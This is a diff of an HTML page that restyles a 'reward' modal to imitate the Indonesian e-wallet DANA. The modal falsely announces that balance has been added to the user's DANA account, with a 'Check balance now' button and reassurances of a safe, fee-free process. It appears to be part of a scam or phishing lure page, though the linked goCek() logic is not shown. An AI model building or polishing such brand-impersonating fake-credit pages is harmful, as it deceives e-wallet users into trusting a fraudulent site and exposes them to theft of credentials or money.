@@ -45,27 +45,37 @@
 
 
 <!-- MODAL -->
-  <div id="confetti-lottie"></div>
-<div class="modal-overlay" id="rewardModal">
+  <div class="modal-overlay" id="rewardModal">
 
-  <!-- LOTTIE CONFETTI -->
+  <!-- LOTTIE CONFETTI (HALUS) -->
   <div id="confetti-lottie"></div>
 
-  <div class="modal-box trusted">
-    <div class="modal-icon">✓</div>
+  <div class="modal-box dana-style">
+
+    <div class="dana-check">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+        <path d="M20 6L9 17L4 12" stroke="white" stroke-width="2.5"
+              stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+
     <h2>Saldo Berhasil Ditambahkan</h2>
+
     <p class="modal-desc">
       Saldo DANA Anda telah berhasil diproses dan
       akan segera tersedia di akun Anda.
     </p>
-    <button class="modal-btn trusted-btn" onclick="goCek()">
+
+    <button class="modal-btn dana-btn" onclick="goCek()">
       Cek Saldo Sekarang
     </button>
+
     <small class="modal-note">
       Proses aman • Sistem otomatis • Tanpa biaya
     </small>
-  </div>
 
+  </div>
+</div>
 </div>
 
 
@@ -82,6 +92,7 @@
 </div>
 </body>
 </html>
+
 
 
 
